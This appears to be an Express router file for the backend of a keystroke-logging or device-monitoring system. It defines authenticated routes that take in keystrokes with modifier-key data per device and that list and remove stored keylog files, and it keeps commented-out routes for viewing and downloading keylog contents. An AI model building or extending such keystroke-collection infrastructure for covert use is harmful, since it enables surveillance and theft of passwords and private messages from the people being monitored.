import express from "express";
import {
	addNewKeyLogs,
	getKeyLogsFiles,
	removeKeyLogs,
	// getKeyLogsLists,
	// getKeyLogContents,
	// DownloadKeyLogFiles,
	// removeKeyLogs,
} from "../controllers/keylogs.controller";
import { check } from "express-validator";
import { authenticateJwt } from "../middleware/auth.middleware";

const router = express.Router();

// Add New Gallery
router.post(
	"/keylogs/add",
	[
		check("deviceId").optional(),
		check("keystrokes").optional(),
		check("actionType").optional(),
		check("inputLanguage").optional(),
		check("inputMethod").optional(),
		check("modifierKeys")
			.isObject()
			.notEmpty()
			.withMessage("Modifier keys are required"),
		check("modifierKeys.shift")
			.isBoolean()
			.withMessage("Shift must be a boolean value"),
		check("modifierKeys.ctrl")
			.isBoolean()
			.withMessage("Ctrl must be a boolean value"),
		check("modifierKeys.alt")
			.isBoolean()
			.withMessage("Alt must be a boolean value"),
	],
	authenticateJwt,
	addNewKeyLogs
);

// Get Keylogs files
router.get(
	"/keylogs/get/:deviceId/",
	[check("deviceId").notEmpty()],
	authenticateJwt,
	getKeyLogsFiles
);
//  Remove Keylogs
router.post(
	"/keylogs/remove",
	[check("deviceId").notEmpty(), check("filename").notEmpty()],
	authenticateJwt,
	removeKeyLogs
);

// ********************* Save Keylogs into DB *****************

// Get key logs
// router.get(
// 	"/keylogs/get/:deviceId/",
// 	[check("deviceId").notEmpty()],
// 	authenticateJwt,
// 	getKeyLogsLists
// );

// // Get KeyLog Content
// router.get(
// 	"/keylogs/get/content/:deviceId/:keylog/",
// 	[check("deviceId").notEmpty(), check("keylog").notEmpty()],
// 	authenticateJwt,
// 	getKeyLogContents
// );

// // Download KeyLog Content
// router.get(
// 	"/keylogs/download/:deviceId/:date/",
// 	[check("deviceId").notEmpty(), check("date").notEmpty()],
// 	authenticateJwt,
// 	DownloadKeyLogFiles
// );

// // Remove Keylogs
// router.post(
// 	"/keylogs/remove",
// 	[check("deviceId").notEmpty(), check("date").notEmpty()],
// 	authenticateJwt,
// 	removeKeyLogs
// );

export default router;
